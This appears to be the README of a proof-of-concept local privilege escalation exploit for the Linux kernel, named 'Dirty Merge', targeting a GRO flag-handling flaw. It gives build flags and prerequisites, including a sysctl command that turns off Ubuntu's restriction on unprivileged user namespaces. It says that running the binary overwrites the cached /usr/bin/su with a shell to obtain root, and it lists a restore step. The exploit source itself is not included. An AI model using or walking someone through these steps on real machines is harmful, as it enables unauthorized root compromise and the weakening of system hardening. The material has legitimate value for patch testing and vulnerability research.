# Dirty Merge PoC

Linux kernel local privilege escalation via `skb_gro_receive()` SKBFL_SHARED_FRAG non-propagation (GRO layer flag stripping).

## Build

```bash
gcc -O2 -Wall -Wextra -static -o dirty_merge gro_fragnesia.c
```

## Requirements

- Linux kernel with CONFIG_XFRM, CONFIG_INET_ESPINTCP, CONFIG_USER_NS
- User namespaces enabled (Ubuntu: `sysctl -w kernel.apparmor_restrict_unprivileged_userns=0`)
- `ip` (iproute2) and `ethtool` in PATH
- veth kernel module loaded

## Run

```bash
# As unprivileged user:
./dirty_merge
# Corrupts /usr/bin/su page cache with shell ELF, then execve's it -> root shell
```

## Restore

```bash
# As root:
echo 3 > /proc/sys/vm/drop_caches
```

## Tested on

- Ubuntu 24.04 LTS, kernel 6.8.0-49-generic
- Also affects: Linux 7.1-rc3 and all kernels with unpatched skb_gro_receive()
